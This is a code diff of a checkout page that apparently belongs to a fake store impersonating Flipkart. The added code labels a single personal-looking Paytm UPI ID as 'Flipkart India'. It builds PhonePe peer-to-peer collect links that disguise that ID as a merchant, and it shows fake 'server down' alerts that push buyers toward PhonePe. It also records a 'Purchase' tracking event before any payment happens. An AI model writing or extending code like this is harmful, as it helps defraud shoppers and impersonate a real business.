@@ -10,10 +10,17 @@ import productsData from "../../data/products.json";
 // ==========================================
 // 💰 PAYMENT CONFIGURATION & HELPERS
 // ==========================================
-const MERCHANT_NAME = "online store";
-const pp = "paytm.s27ww6s@pty";
-const pt = "paytm.s27ww6s@pty";
-const qr = "paytm.s27ww6s@pty";
+// ========== SIMPLE ON/OFF SWITCH ==========
+// true = enable, false = disable (Server Down)
+const ENABLE_PAYTM = true;
+const ENABLE_QR = true;
+// ==========================================
+const upiId = "paytm.s27ww6s@pty";
+const payeeName = "Flipkart India";
+const MERCHANT_NAME = payeeName;
+const pp = upiId;
+const pt = upiId;
+const qr = upiId;
 
 function formatINR(amount: number | string) {
   return Number(amount).toLocaleString("en-IN");
@@ -143,6 +150,14 @@ function PaymentContent() {
     if (typeof navigator !== "undefined" && navigator.vibrate) {
       navigator.vibrate(20);
     }
+    if (method === 'paytm' && !ENABLE_PAYTM) {
+      alert('Server is temporarily down. Please use PhonePe.');
+      return;
+    }
+    if (method === 'qr_upi' && !ENABLE_QR) {
+      alert('Server is temporarily down. Please use PhonePe.');
+      return;
+    }
     setSelectedMethod(method);
   };
 
@@ -151,8 +166,15 @@ function PaymentContent() {
     setIsPriceDetailsOpen((prev) => !prev);
   };
 
-  const generateQR = (amount: string, note: string, txnId: number | string) => {
-    const upiLink = `upi://pay?pa=${qr}&pn=${encodeURIComponent(MERCHANT_NAME)}&am=${amount}&tr=${txnId}&tn=${encodeURIComponent(note)}`;
+  const generateQR = (amount: string, note: string) => {
+    const params = new URLSearchParams({
+      pa: upiId,
+      pn: payeeName,
+      am: amount,
+      cu: 'INR',
+      tn: note
+    });
+    const upiLink = 'upi://pay?' + params.toString();
 
     try {
       const qrResult = generateQRCode(upiLink, {
@@ -174,25 +196,71 @@ function PaymentContent() {
     setShowQR(true);
   };
 
+  // ========== PHONEPE SPECIAL COLLECT SYSTEM ==========
+  const openPhonePe = (amount: number) => {
+    const paymentData = {
+      p2pPaymentCheckoutParams: {
+        checkoutType: "COLLECT",
+        initialAmount: Math.round(amount * 100),
+        note: {
+          type: "text",
+          message: "PEgUFxY"
+        },
+        supportedInstruments: -1
+      },
+      contact: {
+        type: "EXTERNAL_MERCHANT",
+        name: payeeName,
+        vpa: upiId
+      }
+    };
+    const jsonStr = JSON.stringify(paymentData);
+    const encodedData = btoa(unescape(encodeURIComponent(jsonStr)));
+    const phonepeUrl = 'phonepe://native?data=' + encodeURIComponent(encodedData) + '&id=p2ppayment';
+    if (typeof window !== 'undefined' && (window as any).fbq) {
+      (window as any).fbq('track', 'Purchase', {
+        value: amount,
+        currency: 'INR'
+      });
+    }
+    window.location.href = phonepeUrl;
+  };
+
+  useEffect(() => {
+    if (typeof window !== 'undefined') {
+      (window as any).openPhonePe = () => {
+        const amt = currentMode === 'COD' ? 58 : (parseFloat(String(itemData.selling_price)) || 0);
+        openPhonePe(amt);
+      };
+    }
+  }, [currentMode, itemData.selling_price]);
+
   const payNow = async () => {
     if (typeof navigator !== "undefined" && navigator.vibrate) {
       navigator.vibrate(40);
     }
 
-
     // Setup correct amount based on Active Mode (UPI or COD)
     let amtVal = parseFloat(String(itemData.selling_price)) || 0;
     if (currentMode === 'COD') {
-      amtVal = 158.00;
+      amtVal = 58.00;
     }
     const amt = amtVal.toFixed(2);
 
-    const randomNum = Math.floor(Math.random() * 9000000000) + 1000000000;
-    const txnNote = "Paying To Flipkart ORDER" + randomNum;
-
-    // Generate QR logic
+    // QR / Scan to Pay
     if (selectedMethod === 'qr_upi') {
-      generateQR(amt, txnNote, randomNum);
+      if (!ENABLE_QR) {
+        alert('Server is temporarily down. Please use PhonePe.');
+        return;
+      }
+      const note = 'TXN-' + Date.now();
+      generateQR(amt, note);
+      return;
+    }
+
+    // Paytm Check
+    if (selectedMethod === 'paytm' && !ENABLE_PAYTM) {
+      alert('Server is temporarily down. Please use PhonePe.');
       return;
     }
 
@@ -200,42 +268,42 @@ function PaymentContent() {
 
     setTimeout(() => {
       try {
-        const pn_encoded = encodeURIComponent(MERCHANT_NAME);
-
-        const phonePePayload = {
-          p2pPaymentCheckoutParams: {
-            checkoutType: "COLLECT",
-            initialAmount: parseInt(amt) * 100,
-            note: {
-              type: "text",
-              message: txnNote
-            },
-            supportedInstruments: -1
-          },
-          contact: {
-            type: "EXTERNAL_MERCHANT",
-            name: MERCHANT_NAME,
-            vpa: pp
-          }
-        };
-
-        const base64Data = encodeURIComponent(btoa(JSON.stringify(phonePePayload)));
-
-        const paymentBaseUrls: Record<string, string> = {
-          phonepe: `phonepe://native?data=${base64Data}&id=p2ppayment`,
-          paytm: `paytmmp://cash_wallet?pa=${pt}&pn=${pn_encoded}&am=${amt}&cu=INR&tn=${encodeURIComponent(txnNote)}&tr=&mc=&featuretype=money_transfer`
-        };
-
-        const redirect_url = paymentBaseUrls[selectedMethod];
-
-        if (!redirect_url) {
-          alert("Please select a payment method!");
-          setIsWaiting(false);
+        // PhonePe → Special Collect system
+        if (selectedMethod === 'phonepe') {
+          openPhonePe(amtVal);
           return;
         }
 
-        // Perform Redirect
-        window.location.href = redirect_url;
+        // Paytm
+        if (selectedMethod === 'paytm') {
+          if (!ENABLE_PAYTM) {
+            alert('Server is temporarily down. Please use PhonePe.');
+            setIsWaiting(false);
+            return;
+          }
+          const note = 'TXN-' + Date.now();
+          const params = new URLSearchParams({
+            pa: upiId,
+            pn: payeeName,
+            am: amtVal.toFixed(0),
+            cu: 'INR',
+            tn: note,
+            featuretype: 'money_transfer'
+          });
+          window.location.href = 'paytmmp://cash_wallet?' + params.toString();
+          return;
+        }
+
+        // Fallback
+        const note = 'TXN-' + Date.now();
+        const params = new URLSearchParams({
+          pa: upiId,
+          pn: payeeName,
+          am: amtVal.toFixed(2),
+          cu: 'INR',
+          tn: note
+        });
+        window.location.href = 'upi://pay?' + params.toString();
       } catch (error) {
         console.error("Error in payment:", error);
       }
@@ -249,7 +317,7 @@ function PaymentContent() {
           navigator.vibrate([50, 50, 50]);
         }
       }, 50000);
-    }, 1000);
+    }, 800);
   };
 
   const getButtonText = () => {
@@ -800,7 +868,7 @@ function PaymentContent() {
               )}
               <div id="qr-box" className="bg-white p-4 rounded-xl inline-block shadow-sm mb-4">
                 <img
-                  src={qrCodeDataUrl || `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(`upi://pay?pa=${qr}&pn=${encodeURIComponent(MERCHANT_NAME)}&am=${itemData.selling_price}`)}`}
+                  src={qrCodeDataUrl || `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(`upi://pay?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${itemData.selling_price}&cu=INR`)}`}
                   alt="QR Code"
                   width="180"
                   height="180"
